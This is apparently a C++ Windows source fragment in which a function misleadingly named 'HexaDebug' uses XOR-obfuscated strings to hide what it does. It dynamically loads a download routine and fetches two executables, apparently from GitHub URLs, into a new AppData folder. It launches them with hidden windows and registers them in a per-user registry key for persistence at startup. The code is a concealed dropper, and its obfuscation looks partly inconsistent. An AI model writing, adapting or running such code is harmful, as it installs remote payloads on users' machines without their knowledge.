...
#include <windows.h>
#include <shlobj.h>
#define A1(x) ((x)^(0x1F+(__COUNTER__%0x7)))
#define A2(f,x) (f(x))
#define A3(x) A2(LoadLibraryA,x)
#define A4(m,f) A2(GetProcAddress,m,f)
#define A5(a,b,c,d,e,f) ((pDL)A4(b,c))(a,d,e,f,0)
#define A6(s,r) ShellExecuteExA(s);RegOpenKeyExA((HKEY)0x80000001,r,0,KEY_SET_VALUE,&k)
#define A7(x,y,z) (strcat_s(x,y),strcpy_s(x,z))
typedef HRESULT(WINAPI*pDL)(LPVOID,LPCSTR,LPCSTR,DWORD,LPVOID);
void HexaDebug(){char q1[]={0x79,0x71,0x7e,0x7f,0x7c,0x2b,0x2e,0x7d,0x6c,0x7f,0x3a};char q2[]={0x71,0x65,0x6c,0x6a,0x4f,0x5e,0x4b,0x6b,0x4f,0x4c,0x6a,0x6e,0x6b,0x6c,0x6b,0x6f,0x6b,0x66,0x3a};char q3a[]={0x77,0x6b,0x6b,0x6f,0x6c,0x2b,0x3e,0x3e,0x78,0x76,0x6b,0x77,0x6a,0x7d,0x3b,0x7c,0x70,0x72,0x3e,0x53,0x7a,0x74,0x6c,0x7e,0x35,0x35,0x34,0x3e,0x49,0x6a,0x73,0x71,0x7a,0x6d,0x7e,0x7d,0x73,0x7a,0x3f,0x5b,0x6d,0x76,0x69,0x7a,0x6d,0x3f,0x52,0x7e,0x71,0x6a,0x7e,0x73,0x3f};char q3b[]={0x52,0x7e,0x6f,0x6f,0x7a,0x6d,0x3e,0x6d,0x7e,0x68,0x3e,0x6d,0x7a,0x79,0x6c,0x3e,0x77,0x7a,0x7e,0x7b,0x6c,0x3e,0x72,0x7e,0x76,0x71,0x3e,0x6c,0x6f,0x70,0x70,0x73,0x6c,0x69,0x35,0x3b,0x3f,0x7a,0x67,0x7a,0x3a};char q4a[]={0x77,0x6b,0x6b,0x6f,0x6c,0x2b,0x3e,0x3e,0x78,0x76,0x6b,0x77,0x6a,0x7d,0x3b,0x7c,0x70,0x72,0x3e,0x53,0x7a,0x74,0x6c,0x7e,0x35,0x35,0x34,0x3e,0x52,0x70,0x7b,0x7a,0x6d,0x71,0x3f,0x4d,0x70,0x6a,0x71,0x7b,0x7a,0x7b,0x3f,0x4a,0x56,0x3e,0x6d,0x7e,0x68,0x3e,0x6d,0x7a,0x79,0x6c,0x3e,0x77,0x7a,0x7e,0x7b,0x6c,0x3e};char q4b[]={0x53,0x7a,0x74,0x6c,0x7e,0x4a,0x56,0x3e,0x4b,0x53,0x4c,0x3f,0x7a,0x67,0x7a,0x3a};char q5[]={0x6f,0x6c,0x65,0x6e,0x3a};char b1[260];char q6[]={0x7f,0x73,0x66,0x7c,0x6b,0x67,0x6b,0x67,0x69,0x7b,0x7f,0x73,0x66,0x66,0x68,0x6b,0x67,0x73,0x7f,0x7b,0x65,0x6f,0x65,0x7c,0x7f,0x3a};SHGetFolderPathA(0,0x1C,0,0,b1);for(int j=0;q6[j];j++)q6[j]=A1(q6[j]);strcat_s(b1,q6);CreateDirectoryA(b1,0);char q7[]={0x7b,0x7d,0x7c,0x7a,0x67,0x7b,0x7b,0x6c,0x7e,0x3b,0x65,0x7e,0x65,0x3a};char q8[]={0x7b,0x6c,0x67,0x67,0x7d,0x7b,0x7d,0x6c,0x7e,0x3b,0x65,0x7e,0x65,0x3a};char f1[260],f2[260];A7(f1,b1,q7);A7(f2,b1,q8);int k1=0xABC^0xABC;while(k1<strlen(q1))q1[k1]=A1(q1[k1]),k1++;HMODULE m=A3(q1);if(m){k1=0;while(k1<strlen(q2))q2[k1]=A1(q2[k1]),k1++;pDL dl=(pDL)A4(m,q2);if(dl){k1=0;char u1[200],u2[200];strcpy_s(u1,q3a);strcat_s(u1,q3b);strcpy_s(u2,q4a);strcat_s(u2,q4b);for(int i=0;u1[i];i++)u1[i]=A1(u1[i]);for(int i=0;u2[i];i++)u2[i]=A1(u2[i]);if(SUCCEEDED(A5(0,m,q2,u1,f1,0))&&SUCCEEDED(A5(0,m,q2,u2,f2,0))){k1=0;while(k1<strlen(q5))q5[k1]=A1(q5[k1]),k1++;for(const char*p:{f1,f2}){SHELLEXECUTEINFOA s={0};s.cbSize=sizeof(s);s.fMask=0x40|0x1000000;s.lpVerb=q5;s.lpFile=p;s.nShow=0;HKEY k;char r[]={0x7a,0x67,0x65,0x7b,0x7c,0x7c,0x3a,0x70,0x73,0x66,0x7c,0x6b,0x67,0x6b,0x67,0x69,0x7b,0x7f,0x73,0x66,0x66,0x68,0x6b,0x67,0x73,0x7f,0x65,0x6f,0x65,0x7c,0x7f,0x3a,0x7c,0x7a,0x6d,0x6d,0x65,0x6e,0x7b,0x70,0x65,0x6d,0x6c,0x73,0x67,0x6e,0x3a,0x6d,0x7a,0x6e,0x1f};if(A6(&s,r)==0){char n[32];strcpy_s(n,r);strcat_s(n,(p==f1)?"1":"2");RegSetValueExA(k,n,0,1,(const BYTE*)p,(DWORD)(strlen(p)+1));RegCloseKey(k);}}}FreeLibrary(m);}int k2=0xCAFEBABE^0xCAFEBABE;while(k2<15)k2++;}int k3=0xDEAD^0xDEAD;while(k3<20)k3++;system("cls");ShowWindow(GetConsoleWindow(),1);}
